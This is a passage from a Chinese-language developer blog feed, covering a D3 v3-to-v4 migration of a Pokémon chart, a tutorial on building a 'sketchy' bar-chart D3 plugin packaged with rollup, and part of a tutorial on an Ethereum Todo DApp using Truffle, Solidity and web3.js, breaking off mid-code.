以往在 v3，我們可以事先定義 var bundle = d3.layout.bundle();，然後在上面這段程式碼中的 data() 中呼叫 bundle(immunes)，他就會幫我們把 source 跟 target 做連接。
但是在 v4 裡，bundle 被 node.path() 給取代了。
注意喔！是 node.path()，層級是在 node，因此我們要從剛才分類好的 immunes 中將 node 一個一個抓出來呼叫。
另外在這邊我們有用一個 each() 來將每筆 node 資料都加上 d.source = d[0], d.target = d[d.length - 1];原因是為了之後我們點擊每個類別的時候，要利用這個來找出對應的點來上色。
colorPath.jswindow.colorPath = function(d, l, type) &#123;      var type = type || &#x27;strong&#x27;;      if (type == &#x27;strong&#x27;) &#123;        if (l.target === d) return l.source.target = true;      &#125;      if (type == &#x27;weak&#x27;) &#123;        for (type in d) &#123;          if(type !== &quot;size&quot;) &#123;            if (l.target === d[type]) return l.source.target = true;          &#125;        &#125;      &#125;    &#125;
到目前為止，已經把原本 v3 的 cluster layout 轉移到 v4 了，其餘繪製部分就與版本沒有什麼關聯性，需要注意的是資料格式的變動，像是在原本作者的程式碼內，點擊類別的 activate() 函數中，根據 d.name 來判斷位置的部分，由於資料格式的變動，要改為 d.data.name：
activate(d).jswindow.node    .classed(&quot;node--active&quot;, function(target) &#123;        return (target === d) || this.classList.contains(&quot;node--active&quot;);    &#125;)    .classed(&quot;node--target&quot;, function(n) &#123;        return n.target;    &#125;)    .classed(&quot;immune-node&quot;, function(target, l) &#123;        return (this.classList.contains(&#x27;immune-node&#x27;) || target.data.immunes.indexOf(d.data.name) != -1);    &#125;)    ....    ...    ..

其餘繪製部分，包含點擊後的上色邏輯（ activate() 函數中），有興趣的讀者就直接看 code 吧，相信會更清楚！
成果 與 程式碼
不過實際上我並沒有完整 Migration 完成，在原本 v3 的 d3.svg.line.radial() 這裡，v4 的寫法應該是 d3.radialLine()，並搭配上 curve() 函數，只是我並沒有嘗試成功，還請高手指教！
最後，送給大家一隻純 CSS 卡比獸，祝大家早日成為神奇寶貝大師！（好啦其實不像XD…畢竟我對 css 的掌控度大概跟我對腰間肥肉的掌控度一樣低落…）
See the Pen Snorlax-pokemon by Arvin (@arvin0731) on CodePen.



資料來源
d3&#x2F;d3-hierarchy
d3&#x2F;d3-shape
origin version

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>pokemon</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 工作坊 - 製作 D3 plugin 來繪製草圖風格長條圖</title>
    <url>/2017/10/21/d3v4-sketchy-plugin/</url>
    <content><![CDATA[前言前陣子 Mozilla 如火如荼地推出他們的量子專案，而其中在介紹 Quantum CSS 架構的時候，用了許多 可愛的草圖 來解說，讓我突然想到如果能夠將這種手繪風格套用到資料圖表上面，應該會蠻有趣的，也才因此有了這篇文章。
一般來說，我們不管是用 D3.js 或是 Highcharts 等工具來製作圖表，都是朝向專業、有質感、表達清晰的方向去實作，利用各種顏色搭配與互動操作來讓圖表更漂亮更吸引人。
（來源：highchart offical site）
但看久了以後總會有點疲乏，加上現代人專注力越來越短暫，利用一些漫畫、草圖的方式來呈現要說明的東西，反而夠容易抓住大家的注意力，像是上述文章的作者 Lin Clark 在 medium 上就有一系列的 Cartoon Intro 的文章。
但身為前端工程師，手上的工具只有 Javascript、CSS 與 HTML，要怎麼樣 “手繪” 圖表呢？
其實很簡單，利用 D3.js 我們就能做得到！
d3 sketchy
“開玩笑的吧？我知道 D3 可以在 Canvas 上繪圖，但 Canvas 用起來還是沒有操作 svg 來得方便，而 svg 畫的長條圖就是四四方方的啊！”

沒錯我一開始也是這麼想的，但就在某次偶然機會下，拜讀到 D3 in Action 這本書的作者在 Github 上的 code 後讓我改觀了。
這篇文章的範例就是修改自他三年前的 code，當時還是 v3 的版本，似乎也沒有將它推上 npm。
所以順便利用這篇文章記錄並分享一下如何製作出 Sketchy 效果的長條圖，並且包裝成 d3 plugin 來使用！
先給大家看一下比較圖：
一般的長條圖：
套用 sketchy 效果的長條圖：
是不是瞬間活潑很多呢？
雖然你可能會說這樣喪失了圖表的精準度，但很多時候我們只需要用來強調比較性的結果，這種情況就很適合了。
那到底是如何做到的呢？稍微仔細觀察上面的兩張圖，你可能會發現，擁有 Sketchy 效果的長條圖，好像少了間距，多了黑色的手繪編框。
發現到這點以後，答案就呼之欲出了！
其實所謂 Sketchy 的效果，就只是在原本的長條圖上加入了不規則的黑色邊框線條！
而這些黑色的邊框其實是利用 svg 的 path 來繪製的，我們把它拆開來看就很清楚：
See the Pen sketchy-split by Arvin (@arvin0731) on CodePen.


黑色的手繪風格邊框其實是利用至少九條 L 線段繪製出來的，等於是將原本的長方圖用線段包起來，實作上我們只要在原本長條圖的 x, y 位置與寬高上加上一些隨機變動的 offset，就可以做出這樣的效果！原理其實就這麼簡單！

知道原理以後來看點 code 吧！既然他的實作原理很簡單，我們理當可以將它變成一個 d3 的 plugin，像是其他 d3 v4 的模組一樣，讓其他使用者都能夠透過 npm 或是 script 的方式載入使用。
而要做成 d3-plugin 的話，在 code 的架構上我們就要稍微注意一下。
基本上我們希望能沿用一般使用 d3 lib 的語法習慣：
demod3.select(&#x27;#svgParent&#x27;).selectAll(&quot;g&quot;).data(data)    .enter()    .append(&quot;g&quot;)    .attr(&quot;class&quot;, &quot;bar&quot;);d3.select(&quot;#svgParent&quot;)    .selectAll(&quot;g.bar&quot;)    .each(function (d, i) &#123;        var x = i * 100 + 20;        var y = 500 - hscale(d) / 2;        var rw = 100;        var rh = hscale(d) / 2;        // 1. 我們想將此 plugin 放到 d3 的 global object 內        // d3.sketchy 就是我們的 plugin        var sketchyBar = d3.sketchy.rect();        // 2. 我們要能 chaining 函數        sketchyBar            .height(rh)            .width(rw)            .x(x)            .y(y)            .fill(color)            .stroke(&quot;black&quot;)            .strokeWidth(10)            .jostle(5)        // 3. 最後我們利用 d3-selection 來幫我們選取 d3 DOM 傳入        d3.select(this).call(sketchyBar);    &#125;)

要達到這種效果，對 Javascript 熟悉的你應該都不困難，我們只要 export 一個物件，在其內設定一個會回傳函式的 function，製作出 closure，再實作相對應的 setter，並且每一個 setter 都回傳 this 即可。
d3-sketchyimport &#123; select as d3Select, selectAll as d3SelectAll &#125; from &quot;d3-selection&quot;;import &#123; scaleLinear as d3ScaleLinear &#125; from &quot;d3-scale&quot;;import &#123; line as d3Line, curveLinear as d3CurveLinear &#125; from &quot;d3-shape&quot;;let d3sketchy = &#123;&#125;;d3sketchy.rect = function(selection) &#123;  let rh = 50, rw = 10, w = 2, c = [0, 0],    fillColor = &quot;red&quot;, strokeColor = &quot;black&quot;, jostle = 0;  function d3_sketchyRect(selection) &#123;      // 繪製 sketchy 長條圖的主要函式  &#125;  // 實作各個屬性的 setter  d3_sketchyRect.height = function(data) &#123;    if (!arguments.length) return rh;    rh = data;    return this;  &#125;  d3_sketchyRect.width = function(data) &#123;    // ... 作法與 height 相同  &#125;  d3_sketchyRect.x = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.y = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.fill = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.jostle = function(data) &#123; /* ... */ &#125;  // ... 可以再繼續設置你要的函數  return d3_sketchyRect;&#125;export default d3sketchy;

而 export 出去的物件函式執行後所回傳的 function 就是用來接收 d3-selection 傳遞給我們的 d3 DOM，並且繪製 sketchy bar 的函式，相關的 code 大家可以從下面的 codepen 看到，或是到我的 github 上去看也可以：
See the Pen d3-sketchy demo I by Arvin (@arvin0731) on CodePen.


繪製 sketchy bar 的函式主要做三件事：

繪製一般的長條圖

Random 產生一些動態 offset （在 d3_sketchyRect 這個函式中可以看到有一段看似複雜的計算，其實就只是對稱的畫出內外框，像是在原理介紹那邊的圖一樣）

用 Svg path 來繪製手繪邊框


最後來打包 Plugin 吧！其實要打包一個 lib 有很多方法，但是 D3 的作者在 D3 v4 尚未推出前就有寫了一篇文章介紹要怎麼樣製作一個 d3 plugin，為了要能盡量共用所有的 d3 plugin，最好大家都是遵照同樣的準則來處理會比較好。
不過其實也沒什麼準則 XD…主要比較特別的就是 D3 的 plugin 大多是用 rollup 來打包，我猜想是因為當時 webpack 1.x 還沒有加入 tree-shaking 的功能，而針對 plugin 這種小型模組來說，也用不到 webpack 的許多功能，rollup 反而比較適合用來打包 plugin 模組。
完整的 code 與結構可以直接到 github 上參考：d3-sketchy
檔案結構大概就是這樣：

在你的 index.js 中加入：
export &#123;default as sketchy&#125; from &quot;./src/sketchy&quot;;
當作 module 的入口，也方便 require。
接著在你的 package.json 中加入 script：
package.json&quot;scripts&quot;: &#123;    &quot;pretest&quot;: &quot;rm -rf build &amp;&amp; mkdir build &amp;&amp; rollup -c rollup.config.js&quot;,    &quot;test&quot;: &quot;tape &#x27;test/**/*-test.js&#x27;&quot;,    &quot;prepublish&quot;: &quot;npm run test &amp;&amp; uglifyjs build/d3-sketchy.js -c -m -o build/d3-sketchy.min.js&quot;,    &quot;postpublish&quot;: &quot;zip -j build/d3-sketchy.zip -- LICENSE README.md build/d3-sketchy.js build/d3-sketchy.min.js&quot;&#125;

可以看到這邊在 publish 前都會用 uglify.js 來產生 min.js 檔案，如此一來你的 user 就可以選擇要不要下載 minify 過的套件。
最後就是撰寫你的 rollup.config.js：
rollup.config.jsimport resolve from &#x27;rollup-plugin-node-resolve&#x27;;import babel from &#x27;rollup-plugin-babel&#x27;;export default &#123;    entry: &#x27;index.js&#x27;,    dest: &#x27;build/d3-sketchy.js&#x27;,    format: &#x27;umd&#x27;, // umd 的格式能透過 CommonJS 或是 AMD 載入    moduleName: &#x27;d3&#x27;, // 設定為 d3 可以將你的 plugin 放入 global.d3 底下    sourceMap: true,    plugins: [        resolve(),        babel(&#123;            exclude: &#x27;node_modules/**&#x27;        &#125;)    ]&#125;;

這邊要注意兩件事情。

rollup 不會幫你打包你從 node_modules 裡面 import 進來的檔案，所以如果你有用到其他的 d3 plugin，變成在你的 plugin 說明內要告知使用者，記得載入相依的 plugin。或是你也可以向我這邊一樣，透過 rollup-plugin-node-resolve 這個 rollup plugin 來幫我們把 node_modules 底下的 lib 也打包

rollup 不會幫你編譯 babel，如果你真的想用 babel，就像我一樣加入 rollup-plugin-babel 即可。

format 記得設為 umd，這樣才能夠在 CommonJS 或 AMD 環境下都能使用。

最雷的一點在這邊！目前用 rollup 打包 d3 plugin 的話，你需要將 roullup 的版本鎖在 0.41，否則你會發現你編譯出來的 build/d3-xxx.js 內的最前面幾行長得像這樣：


(function (global, factory) &#123;	typeof exports === &#x27;object&#x27; &amp;&amp; typeof module !== &#x27;undefined&#x27; ? factory(exports) :	typeof define === &#x27;function&#x27; &amp;&amp; define.amd ? define([&#x27;exports&#x27;], factory) :	(factory((global.d3 = &#123;&#125;)));&#125;(this, (function (exports) &#123; &#x27;use strict&#x27;;

有看出什麼問題嗎？
factory((global.d3 = &#123;&#125;))
他會將 global.d3 塞入一個空物件，而非先使用原先的 global.d3：factory((global.d3 = global.d3 || &#123;&#125;))
如此一來，你如果在載入 plugin 之前先載入其他 d3 plugin，就會發生問題了…
&lt;script src=&quot;https://d3js.org/d3.v4.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;../build/d3-sketchy.js&quot;&gt;&lt;/script&gt; &lt;!-- 裡面的 d3 object 會蓋掉上面 d3.v4.js 產生的---&gt;

可能有其他解法，但看了 d3 的一些 plugin 也是先將版本卡在 0.41。
當你做完上述工作後，在你的 repo 底下執行 npm install，就會產生 build folder，裡面含有：

d3-sketchy.js
d3-sketchy.min.js
d3-sketchy.js.map (如果你 rollup.config.js 有設定 sourceMap: true 就會有此檔案)

如此一來別人就能使用你的 plugin 了：
&lt;script src=&quot;../build/d3-sketchy.js&quot;&gt;&lt;/script&gt;&lt;script&gt;    var sketchyBar = d3.sketchy.rect();    //...    //..&lt;/script&gt;

結論有些時候看似很複雜的東西，其實原理卻非常簡單，只是需要發揮點創意。剛好透過這篇也學習了一下 rollup 的相關設定，雖然我私人猜測 rollup 應該還是會慢慢被 webpack 壓過去，即便 rollup 作者寫了這篇文章。這篇算是一個小小的筆記，不是太完整，若有任何疑問或建議歡迎留言討論！
資料來源
d3-sketchy
d3-plugin
rollup

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>plugin</tag>
        <tag>rollup</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ethereum 上開發簡單的 Todo App</title>
    <url>/2018/04/01/dapp-todo-on-ethereum/</url>
    <content><![CDATA[前言近一兩年區塊鏈的技術造成一股熱潮，由於加密貨幣在投資上的炒作，常看到的區塊鏈範例都是和虛擬貨幣相關連的服務，另外，技術的應用焦點也常放在金融和會計業上，這是因為這兩個行業長久以來在市場上都有球員兼裁判的嫌疑（例如會計有資產信用背書和被雇用人這兩種矛盾的角色），因此需要一個「備受信任」的機制來重拾市場對它們的信任。而區塊鏈，或是廣義上來說的分散式賬本技術，正是一個有潛力的解法。不過就像《區塊鏈革命》這本書所說的，這個技術實現了「價值上的轉移」，理當會對更多的行業帶來影響。
Ethereum 提出 DApp(Decentralized App) 的想法，也就是藉著區塊鏈上佈署的智慧合約（Smart Contract）對區塊鏈資料進行操作，使得不但資料無法被竄改，連合約（程式碼）本身也無法被竄改，因此這些合約可以在沒有第三方（例如律師）的見證下具有信用。以下簡單的將傳統 web app 和 DApp 作類比：



–
–
–
–



Web app
front-end
back-end API
Database


DApp
front-end
smart contract
Blockchain(Ethereum)


由於這篇只會提到開發 Todo 程式的必要部分，如果需要更完整對於智慧合約的介紹和 Ethereum 的相關知識可以參考 Taipei Ethereum Meetup 的部落格或是 gasolin 網友編寫的 gitbook。
另外，雖然這裡只是實作一個簡單的 Todo 程式，但是可以想像如果擴展成接案平台的核心，發包人和接案人商量一個完成任務的評估方式和報酬，例如完成幾個測試後會收到多少款項，接著將剛剛的合約寫入 DAapp，未來只要接案人的專案通過測試後就能自動完成收款。
以下對 DApp 的實作利用 Truffle 這個開發框架，以 Solidity（Ethereum 官方開發的編程語言）開發智慧合約，並利用 javascript 的 web3.js 套件和合約溝通，以下分別就這兩個工具介紹。另外如果使用 VSCode 開發，可以安裝 Solidity 的開發工具，方便檢查語法上的問題。
這是這篇所使用到的程式碼
Truffle - Ethereum Development FrameworkTruffle 是 Ethereum（以太坊）的開發框架，可以建立測試用的區塊鏈，並將寫好的智慧合約編譯佈署，由於以太坊的開發環境變動的相當快，因此務必注意到不同版本的支援問題。這裡使用最新的 truffle 版本(v4.1.3)，因為這個版本建立的測試用區塊鏈支援 websocket 連線，配合 web3.js v1.0 之後的版本可以利用 socket 監聽事件的觸發，這是比較有效率的作法。
Step1. 安裝 trufflenpm install -g truffle@4.1.3

Step2. 建立專案資料並初始化mkdir EthereumTodo &amp;&amp; cd EthereumTodotruffle init# 資料夾結構如下# build/       合約編譯完才會產生，這裡會生成描述合約的 json 檔，包含合約的 ABI(Application Binary Interface)# contracts/   合約的檔案，以 .sol 為結尾# migrations/  描述如何將合約佈署到區塊鏈# test/        用來測試合約# truffle.js   設定 truffle

Step3. 查看版本資訊truffle version# Truffle v4.1.3 (core: 4.1.3)# Solidity v0.4.19 (solc-js)
請務必先檢查支援的 Solidity 版本，由於目前這個語言變動很快，需要更加注意版本間的語法差異。
Step4. 建立測試用區塊鏈# ganache-cli 是 truffle 內附的指令，用來取代原先的 testrpc# 用 --seed apple banana cherry，指定隨機生成的種子，這樣可以確保每次建立的區塊鏈都是相同的，# 如此一來合約的佈署位址也會相同，這在測試環境上非常好用ganache-cli --seed apple banana cherry## 執行結果會順便產生測試用的帳號和 key，帳號會在之後執行合約時用到# Available Accounts# ==================# (0) 0x1d489c3f8ed5ee71325a847888b2157c9ac29c05# ...# Private Keys# ==================# (0) bea70301d065cf7946f25251c73dbfff93d4320715e43bdc0d5087553074cb64# ...# Listening on localhost:8545

Step5. 設定 truffle 環境// truffle.jsmodule.exports = &#123;  networks: &#123;    development: &#123;      host: &quot;localhost&quot;,      port: 8545,     // default port of ganache-cli      network_id: &quot;*&quot; // Match any network id    &#125;  &#125;&#125;;

建立 Todo 合約Step1. 設定資料結構// contracts/TodoFactory.sol// 指定編譯的版本pragma solidity ^0.4.17;// 指定合約的名稱，之後佈署或是測試時都是根據這個名稱（不是檔案名稱）contract TodoFactory &#123;  struct Todo &#123;    string taskName;    bool isCompleted;    bool isValid;  &#125;  Todo[] todos;&#125;
以上簡單的設定在合約中資料儲存的方式，利用 struct 包裹每個 todo 應該包含的資料，並利用陣列儲存。Solidty 常用的型別包含int(uint, uint256), uint8, bool, address(8 bytes), byte ，而 string 相當於是 byte[]。由於儲存資料在區塊鏈上相當耗費成本（以 POW 機制來說，就是需要有人挖礦），智慧合約的執行上也必須消耗 gas，因此會盡可能的選用適當的型別以減少寫入的資料量和運算量，另外在 struct 中盡可能的將相同的資料型別排列在一起，也可以節省儲存的資料量。
除了 Array 之外，Solidity 中常用的還有 mapping，代表 key-value 之間的對應。例如
// 由 id(int) 對應到 todo(Todo)mapping(int =&gt; Todo) idMapTodo;

Step2. 加上操作資料的 Function(Method)contract TodoFactory &#123;  function addTodo(string _taskName) public &#123;    Todo memory todo = Todo(_taskName, false, true);    uint todoId = todos.push(todo) - 1;  &#125;&#125;
在 addTodo 中，我們先以輸入的 _taskName 初始化一個型態是 Todo 的物件，接著加進合約中的 todos 陣列，並以陣列索引當作 id。注意到上面的函式即使加上回傳值也無法回傳預期的結果，之後會再解釋這部份。
Solidity 中 contract 和 function 的關係，可以類比成 class 和 function 的關係，contract 也是可以被繼承的，而 function 可以加上一些 modifier，例如：

public: 代表可以被外界調用
private: 代表只能被此合約中的其他 function 調用
internal: 代表可以被此合約和繼承的合約調用，像是 c++ 的 protected
external: 代表只能被外界調用或是
view: 代表此 function 不會對區塊鏈上的資料作任何的更改，像是 get function
pure: 代表此 function 不會操作到區塊鏈上的任何資料，所以 pure function 不會消耗任何的 gas，可以想像這就是 util function

另外需要特別注意的是，Solidity 中執行函式的方式被分成 Call 和 Transaction 兩種（雖然程式碼都是 function）

Call: 代表執行函式但是不會對區塊鏈作任何的修改，可以使用「回傳值」，通常會被這樣使用的函式包含 view 或是 pure 這兩個關鍵字，如果對於一個有寫入的函式使用 call 的方式執行，結果不會寫入任何的資料
Transaction: 和 Call 相反，在執行上會寫入資料，因此需要等待礦工們將資料寫入，所以函式的「回傳值」僅代表 transaction hash，不會回傳預期的結果。

以上可以參考這個討論串
除了預設的關鍵字，也可以利用關鍵字 modifier 宣告自訂的 modifier，類似 python 或是 js ES7 中的 decorator（裝飾字），例如
contract TodoFactory &#123;  modifier isValidTodo(uint _todoId) &#123;    // require 要求傳入的參數要是 true，否則中止操作，並退還執行時消耗的 gas    // 以下連結有更詳細的比較和說明    // https://medium.com/taipei-ethereum-meetup/比較-require-assert-和-revert-及其運作方式-30c24d534ce4    require(isTodoValid(_todoId));    _; // 這是語法上必要的  &#125;  function deleteTodo(uint _todoId) public isValidTodo(_todoId) &#123;    todos[_todoId].isValid = false;  &#125;&#125;
在上述的程式碼中，首先利用自訂的 modifier 檢查想要刪除的元素是否有效，有效才會刪除。回到前面新增物件的部分，把陣列索引當作 id 是很奇怪的作法，因為實作上如果把陣列的元素移除，可能會想用其他的元素填補這個空隙，以節省儲存空間，這樣索引就會被更改，例如 [a, b, c] 移除 b 後會變成 [a, c]，但是因為區塊鏈的寫入成本極高，因此當刪除陣列元素時，不應該搬移其他的元素，所以直接將這個元素設定成 invalid 是成本較低的作法，當然也可以用 delete 刪除，但是會造成空隙。
另外 Solidity 中的函式可以回傳複數的值，回傳時類似 tuple 以()包裹，不過回傳的資料型別只能是原始的資料型別或是陣列，也就是說不能回傳 struct 或者是 string[]。
Step3. 加上 event 標示已完成的事件如同前面提到的，執行 addTodo, deleteTodo, completeTodo 的時候都會以 Transaction 的方式執行（不然不會寫入資料），因此為了讓其他人知道執行完畢，並收到執行的結果，必須使用 event 觸發的方式。
contract TodoFactory &#123;event OnTodoAdded(uint todoId);  function addTodo(string _taskName) public &#123;    Todo memory todo = Todo(_taskName, false, true);    uint todoId = todos.push(todo) - 1;        // trigger event:    // 這樣才能取得原來的回傳值 todoId    // 在 v0.4.21 之後，必須寫成 emit OnTodoAdded(todoId)    OnTodoAdded(todoId);  &#125;&#125;
event 的宣告就像是函式的 header，利用 event 可以讓多個 client 監聽智慧合約的變化，而且這些 event 一旦被觸發就會被紀錄在區塊鏈裡面，未來可以很輕易的查詢過去發生過的紀錄 
Step4. 編譯及佈署合約原則上就是照抄 migrations/1_initial_migration.js
// migrations/4_deploy_todoFactory.jsconst TodoFactory = artifacts.require(&#x27;TodoFactory&#x27;);module.exports = function (deployer) &#123;  deployer.deploy(TodoFactory);&#125;

接著依序編譯和佈署合約到自建的測試區塊鏈上
truffle compile
執行結果會 在 build/ 建立 TodoFactory.json
truffle migrate## 執行結果# Running migration: 4_deploy_todoFactory.js#   Deploying TodoFactory...#   ... 0xfecf0206d68c496cf067e320a4d4b5d294dfe89979552f7b6b8ab38696c51356#   TodoFactory: 0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c# Saving successful migration to network...#   ... 0x6f592087ebfa7d5d77cce3f82c9d1222148c25499c348a59480ccfb3fe5884e1# Saving artifacts...

其中 0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c 就是合約部署在區塊鏈上的位址
Step5. 測試由於已經佈署在區塊鏈上的合約無法再被修改，最多只能利用事先設定的函數調整參數，因此每一次的合約更新都會導致地址的改變，在實際的應用上代表著每次合約的更新都需要改變利用到的合約位址，這是非常麻煩的事情，因此佈署前的測試相當重要，另外測試對於 TDD（Test Drive Development） 或是 CI,CD 的流程也是不可或缺的。truffle 內建測試用的框架，利用 Mocha 和 Chai 這兩個在 javascript 中常用的套件（兩者所使用的版本可以從 ganache-core 查看）
以下的測試可以驗證合約是否正常發佈
// test/test_todoFactory.jsconst TodoFactory = artifacts.require(&#x27;TodoFactory&#x27;);contract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  before(async () =&gt; &#123;    // 在所有測試開始前佈署合約    contract = await TodoFactory.deployed();  &#125;);  it(&#x27;Should contract deployed properly&#x27;, () =&gt; &#123;    // 驗證合約是否已經被佈署    assert.isDefined(contract);  &#125;);&#125;
對於非同步的情形而言，可以使用 Promise 或者是 Callback 的語法，這裡用 Promise 配合 async-await 比較簡潔。不過因為目前 ganache-core 所使用的 chai 版本為 3.5，無法抓到非同步的錯誤，因此如果需要這方面的測試可以用以下的寫法
contract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should not complete invalid task&#x27;, async () =&gt; &#123;    contract.completeTodo(9527, (err) =&gt; &#123;      assert.isDefined(err);    &#125;)  &#125;);&#125;

另外在測試的部分 truffle 對於 Call 和 Transaction 兩種執行方式並沒有區分，都是用一般函式的呼叫方式，差別在後者回傳的是 transaction hash，從 hash 可以取得觸發的 event 的資訊
// test/utils.jsfunction getEvents (tx, filter) &#123;  const logs = tx.logs;  const events = _.filter(logs, filter);  return events;&#125;// test/test_todoFactory.jscontract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should add new todo properly&#x27;, async () =&gt; &#123;    // addTodo 的呼叫是 Transaction 所以即使 addTodo 中有回傳值，也無法收到    const tx1 = await contract.addTodo(Todo1.taskName);    const events1 = utils.getEvents(tx1, &#123; event: &#x27;OnTodoAdded&#x27;, logIndex: 0 &#125;);    todoId1 = events1[0].args.todoId;  &#125;);&#125;

另外如果要檢查執行時觸發的 event 可以參考 stackoverflow 上的討論來驗證
// test/utils.jsfunction assertEvent(contract, filter) &#123;  return new Promise((resolve, reject) =&gt; &#123;    const event = contract[filter.event]();    // event.watch, event.get, event.stopWatching    // 在 web3 中也有對應的 function 來監聽區塊鏈上的事件    event.watch();    event.get((error, logs) =&gt; &#123;      const log = _.filter(logs, filter);      if (!_.isEmpty(log)) &#123;        resolve(log);      &#125; else &#123;        reject(new Error(&quot;Failed to find filtered event for &quot; + filter.event));      &#125;    &#125;);    event.stopWatching();  &#125;);&#125;,// test/test_todoFactory.jscontract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should delete todo properly&#x27;, async () =&gt; &#123;    await contract.deleteTodo(todoId1);    await utils.assertEvent(contract, &#123; event: &#x27;OnTodoDeleted&#x27;, args: &#123; todoId: todoId1 &#125; &#125;);  &#125;);&#125;
接著執行以下指令後可以得到測試的結果
truffle test

講完 DApp「後端」的部分後，接下來是利用前端來和智慧合約互動
Web3.jsWeb3.js 提供 javascript 用來和以太坊互動的 API，這邊使用的版本是 v1.0，v1.0 與之前的版本有相當大的差別，除了額外提供 Socket 接口監聽事件，API 的呼叫方式也完全不同，甚至有些連運作的邏輯也不同，所以在查詢資料上需要特別注意這點。前端的功能除了傳統 Todo App 的新增、刪除、標記完成任務的功能之外，還可以列出這個 DAPP 過去的操作紀錄。但這邊只會強調與 web3 相關的接口部分，其餘的部分請看完整的程式碼，運作流程如下：


Step1. 安裝 web3npm install web3

Step2. 初始化 web3// ethereum-todo/src/config/config-web3.js// 使用 websocket// localhost:8545 是利用 truffle 建立的測試用區塊鏈// const web3 = new Web3(new Web3.providers.WebsocketProvider(&#x27;ws://localhost:8545&#x27;)) const web3 = new Web3(&#x27;ws://localhost:8545&#x27;);// or 使用 http// const web3 = new Web3(new Web3.providers.HttpProvider(&#x27;ws://localhost:8545&#x27;)) // const web3 = new Web3(&#x27;http://localhost:8545&#x27;);
除了自己架設測試的區塊鏈外，也可以使用公開的測試區塊鏈。
Step3. 初始化合約這邊需要用到合約的 ABI（Application Binary Interface） 以及在區塊鏈上佈署的位址，ABI 就是紀錄合約中使用到的函數和變數的文件，這裡有更詳細的說明，首先先將前一個部分編譯後的檔案（build/contracts/TodoFactory.json）複製到專案資料夾
// ethereum-todo/src/contracts/todoContractimport web3 from &#x27;config/config-web3&#x27;;import TodoFactoryJSON from &#x27;./TodoFactory.json&#x27;;const CONTRACT_ADDRESS = &#x27;0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c&#x27;;const todoContract = new web3.eth.Contract(TodoFactoryJSON.abi, CONTRACT_ADDRESS);export default todoContract;
這樣就建立一個合約的實體可供操作
Step4. 執行合約重複前面提到的，Transaction 合約的執行需要消耗 gas，所以我們需要有一個帳號來花費 gas 執行這些合約，可以從 truffle 建立的區塊鏈中找到測試用的帳號（也就是執行時建立的那十個），並藉著 web3 提供的 api 查看帳號擁有的 gas：
// ethereum-todo/src/helpers/accountsHelper/balance.jsimport web3 from &#x27;config/config-web3&#x27;;export async function getBalanceAsync(address) &#123;  const balance = await web3.eth.getBalance(address);  return balance;&#125;// 接者可以在任何地方使用 getBalanceAsync 來取得特定使用者目前的 gas 量，例如// const DEFAULT_USER = &#x27;0x1d489c3f8ed5ee71325a847888b2157c9ac29c05&#x27;;//// void async function() &#123;//   const balance = await getBalanceAsync(DEFAULT_USER);//   console.log(&#x27;Balance of account0&#x27;, balance);// &#125;()

在 web3 中 Call 和 Transaction 分別對應 contract.methods.myMethod.call 和 contract.methods.myMethod.send 兩種呼叫方式，後者在之前的版本是 sendTransaction。兩者的使用如下
// ethereum-todo/src/helpers/todoHelpers/todoAction.jsimport todoContract from &#x27;contracts/todoContract&#x27;;// 第一個測試帳號的 gas 數目相當多，很適合用來測試合約的執行const DEFAULT_USER = &#x27;0x1d489c3f8ed5ee71325a847888b2157c9ac29c05&#x27;;export async function getTodoAsync(todoId) &#123;  // 估計需要消耗的 gas  const gas = await todoContract.methods.getTodo(todoId).estimateGas();  console.log(&#x27;Get Todo: Estimated gas&#x27;, gas);  // 因為 getTodo 不會修改到資料，所以用 call   const result = await todoContract.methods.getTodo(todoId).call(&#123;    from: DEFAULT_USER,    gas:200000,  &#125;);  return result;&#125;export async function addTodoAsync(taskName) &#123;  // 估計需要消耗的 gas，因為必須寫入字串，所以很可能會消耗超過預設值 90000 的 gas，  // 故調高 gas limit 到 200000  const gas = await todoContract.methods.addTodo(taskName).estimateGas();  console.log(&#x27;AddTodo: Estimated gas&#x27;, gas);  // 因為 addTodo 會修改資料，所以必須用 send  // 如果這邊改成 call，依然可以執行，但不會有資料的寫入  await todoContract.methods.addTodo(taskName).send(&#123;    from: DEFAULT_USER,    gas: 200000,  &#125;);&#125;

無論用 call 或是 send 都可以指定消耗的 gas 最大值（稱為 gas limit 這裡是 200000），gas limit 的設計是為了防止智慧合約在執行時產生無窮迴圈的情形，因為所有的運算都需要消耗 gas，一旦消耗 gas 的總量到達 gas limit，就會終止執行。
Step5. 監聽執行的結果還是一樣 Transaction 的執行需要等到礦工們寫入資料才算真的完成，因此只能利用監聽事件的方式來確定。在這個專案中將這些監聽的處理放在 src/events 資料夾下，未來或許放在 middleware 是比較漂亮的方式。
// ethereum-todo/src/events/todoEvents.jsimport todoContract from &#x27;contracts/todoContract&#x27;;import * as todoHelper from &#x27;helpers/todoHelpers&#x27;;import &#123; addTodo, deleteTodo, completeTodo &#125; from &#x27;containers/App/duck/todo&#x27;;import store from &#x27;../store&#x27;;// Event// OnTodoAdded 是 event 的名稱todoContract.events.OnTodoAdded(&#123;&#125;, async (error, result) =&gt; &#123;  if (error) &#123;    console.log(error);    return;  &#125;  // result  // &#123;  //   raw: &#123;  //     data: &quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;,  //     topics: [&quot;0x6edbfebf4adc3e180444860a21cd838446f00049410a44c6ec4a178a2ebe529b&quot;]  //   &#125;,  //   returnValues: &#123;  //     todoId: 1  //   &#125;,  //   address: &quot;0x21e4624c5A0B3fdA81D0833d412DDED2bb3A7a7C&quot;, // 合約的 address  //   blockHash: &quot;0x9186b52740bff34239c92137ae1ecb7205a028b540e30b79256b13b829354252&quot;,  //   